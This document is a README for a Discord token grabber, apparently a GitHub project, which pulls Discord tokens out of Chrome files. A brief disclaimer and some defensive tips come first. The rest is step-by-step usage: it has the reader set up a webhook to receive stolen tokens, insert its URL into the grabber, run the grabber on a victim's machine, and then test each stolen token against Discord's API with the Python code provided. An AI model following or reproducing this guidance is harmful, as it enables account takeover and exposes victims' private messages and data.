# Discord token grabber

## Introduction

This program is a proof of concept designed to highlight security vulnerabilities within Discord's service by extracting Discord tokens from Google Chrome files. These tokens grant unauthorized access to accounts, allowing visibility into private conversations, servers, friends, and other sensitive details without the account owner's knowledge.

The primary goal of this tool is educational, aiming to demonstrate potential exploits by bad actors due to common oversights in security practices. It is intended to raise awareness about the ease of account compromise and to encourage better security measures among Discord users.

## Disclaimer

This tool is provided for educational purposes only to showcase vulnerabilities in Discord's security mechanisms. It is not intended, nor should it be used, to gain unauthorized access to accounts. The program supports only Google Chrome as it is a proof of concept, highlighting that the issue is not browser-specific but a broader concern with online account security.

## Security Measures and Recommendations

If you suspect your account has been compromised by a similar exploit:

1. **Change Your Password**: Immediately changing your Discord password invalidates old tokens, preventing further unauthorized access.
2. **Use Antivirus Software**: Scan your device for malicious programs that may be exploiting vulnerabilities or stealing information.
3. **Be Cautious**: Avoid running unknown code or programs from untrusted sources. This is a common way attackers gain access to your devices and accounts.
4. **Avoid Sharing Browser Developer Tools Data**: If someone asks you to use the developer tools in your browser to type commands, show your network activity, or reveal your local storage while you have Discord open, be highly suspicious. These actions can lead to your Discord tokens being extracted, putting your account at risk. There is a very high likelihood that such requests are hacking attempts. It's crucial to safeguard your information and not comply with these requests from individuals you do not trust.

## Limitations of the Program

- **User Execution Required**: The program must be run on the victim's machine, emphasizing the importance of caution when executing unknown programs or scripts.
- **Token Accumulation Issue**: In cases where multiple Discord accounts are used, or passwords are frequently changed, the large number of tokens discovered may exceed message character limits, preventing their transmission.
- **Browser Support**: Currently, this proof of concept only targets Google Chrome. However, the vulnerability is not limited to a single browser and can potentially be demonstrated across different platforms, including the Discord client itself.

## Conclusion

This project serves as a stark reminder of the ongoing risks and challenges in digital security, particularly within widely used platforms like Discord. By understanding these vulnerabilities, users can take proactive steps to secure their accounts and personal information against unauthorized access.



## Usage Guide

### Step 1: Create a Discord Webhook

- **Create a Discord Server**: Ensure you have or create a new Discord server where you possess webhook permissions.
- **Create a Text Channel**: In your server, create a new text channel dedicated to receiving the data.
- **Setup Webhook**:
  1. Navigate to the settings of the channel you created.
  2. Select "Integrations" followed by "Webhooks".
  3. Click on "New Webhook" to create a new webhook for this channel.

### Step 2: Obtain Webhook URL

- **Copy Webhook URL**: In the webhook setup window, you will see an option to copy the webhook URL. Make sure to copy this URL; it will be used to send the extracted tokens to your Discord channel.

### Step 3: Configure the Grabber

- **Insert Webhook URL into Code**: Open the token grabber code and locate the placeholder ```YOUR WEBHOOK URL```. Replace this placeholder with the webhook URL you copied in the previous step.
- **Save Changes**: Ensure that you save the modifications to the code.

### Step 4: Execution on the Target Machine

- **Run the Grabber**: With the code properly configured, it's ready to be executed on the victim's machine. Remember, for this step to be successful, you need physical or authorized access to the device.

### Step 5: Token Retrieval

- **Check Your Discord Channel**: If the victim has previously logged into Discord via their Chrome browser, the tokens should now be transmitted to the Discord channel you set up. These tokens appear in the channel linked to the webhook you configured earlier.

## Validating Discord Tokens

To verify the validity of a Discord token you've acquired, you can utilize the following Python function. This script leverages the `requests` library to make a GET request to the Discord API, specifically to the "users/@me" endpoint, which returns information about the user associated with the provided token. If the token is valid, you will receive a JSON response containing basic user information.

```python
import requests

def test(token: str) -> None:

    response = requests.get(
        url="https://discord.com/api/v9/users/@me",
        headers={
            "content-type": "application/json",
            "Authorization": token
        }
    )

    print(response.json())

# Example usage:
# test('your_discord_token_here')
```

Before running this script, ensure you have the `requests` library installed. If not, you can install it using pip:

```shell
pip install requests
```
